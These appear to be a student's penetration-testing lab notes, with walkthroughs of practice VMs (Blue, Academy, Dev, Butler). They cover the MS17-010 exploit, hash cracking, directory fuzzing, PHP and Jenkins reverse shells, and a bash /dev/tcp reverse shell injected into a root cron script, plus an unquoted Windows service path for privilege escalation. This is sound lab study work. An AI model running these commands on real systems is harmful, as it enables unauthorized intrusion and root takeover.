> Set NAT Network Settings
> 

> [!faq] 
> User: user
> Password: Password123!
> -----------------
> User: administrator
> Password: Password456!

**US Keyboard:**
![[Pasted image 20221227165418.png]]


### Walkthrough - Blue

![[Blue_Report.ctd.pdf]]

![[Pasted image 20221227174408.png]]

> [!info] 
> Manually: MS17-010 Exploit Code:
> https://github.com/3ndG4me/AutoBlue-MS17-010
> Install:
> `pip install -r requirements.txt`
> Check target:
> `python eternal_checker.py 172.16.215.130`
> `cd shellcode`
> `./shell_prep.sh `

![[Pasted image 20221227175110.png]]

![[Pasted image 20221227175900.png]]


### Set Up - Academy

> [!info] 
>  Default Settings
>  Use NAT for Network


### Walkthrough - Academy

> [!info] 
> Login:
> User & PW: root / tcm 
> Fetch new IP:
> `dhclient`
> Now find out which IP:
> `ip a`

> [!check] 
>` ftp <IP of Machine> `
>Try to login with `anonymous` as user and password
>Dictionarly listing with `ls`
>Fetch a file: `get note.txt`

> [!hint] 
> Hash Identifier:
> `hash-identifier`

> [!hint] 
> Cracking Hashes
> (Do it on base OS, because it should use GPU to crack it faster)
> `hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt`

> [!todo] 
> Enumeration Website with **dirb**
> It's using its own wordlist.
> `dirb http://192.168.138.129` 

> [!todo] 
> Enumeration Website with ffuf:
> This example only enumerate on first level.
> `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.138.129/FUZZ` 

> [!info] 
> PHP Reverse Shell:
> https://github.com/pentestmonkey/php-reverse-shell
> Before Upload Change IP & Port
> Open Reverse Shell listener: `nc -nvlp 1234`

> [!info] 
> Privilage Escalation:
>  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
>  

![[Pasted image 20230102125850.png]]
![[Pasted image 20230102130036.png]]
![[Pasted image 20230102130354.png]]
> [!info] 
> Check cron:
> `crontab -u root -l` 
> [!info] 
> Check systemctl:
> `systemctl list-timers` 

> [!info] 
> Linux Process Info:
>  https://github.com/DominicBreuker/pspy

> [!tip] 
> One line reverse shell:
>  `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
>  Add reverse shell to backup.sh, because backup.sh is executed by root as crohn job every minute. Like this we can get root access on VM.



### Walkthrough - Dev

#### My own Report

![[Report_Dev.pdf]]


#### Guide from Video

> [!info] 
> Local File Inclution: https://www.exploit-db.com/exploits/48411
> 

![[Pasted image 20230102182616.png]]
![[Pasted image 20230102183026.png]]


### Walkthrough - Butler

#### Own Report

![[Own_Report_Butler.pdf]]



#### Video Walkthrough

> [!check] 
> Check what is default `user` and `pw` for Jenkins:
> It's `admin` and `password`

> [!hint] 
> In ZAP:
> Double click on entry to see body which was sent.  

![[Pasted image 20230107113814.png]]
![[Pasted image 20230107113922.png]]

![[Pasted image 20230107114447.png]]

> [!tip] 
> Check size of response 

![[Pasted image 20230107114807.png]]

> [!tip] 
> Jenkins Reverse shell script:
> revsh.groovy:
> https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

> [!tip] 
> Windows Privilege Escalation Awesome Scripts
>  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

![[Pasted image 20230107145617.png]]

> [!info] 
> It here is no quotes around path. Windows will try to execute C:\Program.exe, then   C:\Program Files.exe, then  C:\Program Files (x86).exe, .... and so on until it can execute. 

![[Pasted image 20230107150633.png]]

> [!check] 
> Services:
> `sc stop WiseBootAssistant`
>  sc query WiseBootAssistant`
>  `sc start WiseBootAssistant`

![[Pasted image 20230107151210.png]]


